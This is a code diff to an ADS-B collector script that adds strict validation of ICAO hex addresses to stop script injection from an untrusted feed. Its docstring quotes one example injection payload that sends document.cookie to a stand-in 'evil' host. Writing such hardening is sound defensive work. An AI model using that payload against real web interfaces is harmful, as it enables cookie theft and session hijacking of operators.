@@ -1,4 +1,4 @@
-# Version: 3.4.83
+# Version: 3.4.84
 """
 collector.py — ADS-B data fetcher and classifier.
 
@@ -1040,6 +1040,30 @@ def is_pseudo_icao(icao: Optional[str]) -> bool:
     aircraft). Their data is ATC-relayed and often inaccurate or
     incomplete — excluded from all stats extremes."""
     return bool(icao) and str(icao).startswith("~")
+
+
+# A real Mode S address is exactly 6 hex digits; dump1090 prefixes synthetic
+# TIS-B/MLAT targets with a single '~' (see is_pseudo_icao). Nothing else is a
+# valid aircraft address.
+_ICAO_HEX_RE = re.compile(r"^~?[0-9A-F]{6}$")
+
+
+def clean_icao_hex(raw) -> str:
+    """Normalize an ADS-B ICAO hex to canonical upper-case form, or return ''
+    if it isn't a valid address.
+
+    v3.4.84: this is a SECURITY boundary, not just tidiness. The hex flows from
+    the (config-controlled, untrusted) feed all the way into the UI, where it is
+    interpolated into onclick JS-string and element-id contexts. A malicious or
+    MITM'd feed could otherwise send a 'hex' like
+    `');fetch('//evil/?c='+document.cookie);//` and have it stored and later
+    executed in the operator's browser. By accepting only `~?[0-9A-F]{6}` at
+    every ingest point, no quote/script/markup character can ever reach those
+    sinks. Callers treat '' as "drop this contact"."""
+    if not raw or not isinstance(raw, str):
+        return ""
+    v = raw.strip().upper()
+    return v if _ICAO_HEX_RE.match(v) else ""
 
 
 # Cache of tail → ICAO lookups so we don't hammer hexdb.io when the collector
@@ -2912,7 +2936,9 @@ def _to_number(v):
 def normalize(raw: Dict) -> Dict:
     """Convert raw receiver data into clean format."""
     return {
-        "hex": raw.get("hex", "").strip().upper(),
+        # v3.4.84: validated hex (only ~?[0-9A-F]{6}); '' if invalid, which the
+        # caller's `if not ac["hex"]: continue` guard drops. See clean_icao_hex.
+        "hex": clean_icao_hex(raw.get("hex")),
         "callsign": (raw.get("flight") or raw.get("callsign") or "").strip(),
         "speed": _to_number(raw.get("gs") or raw.get("speed")),
         "lat": _to_number(raw.get("lat")),
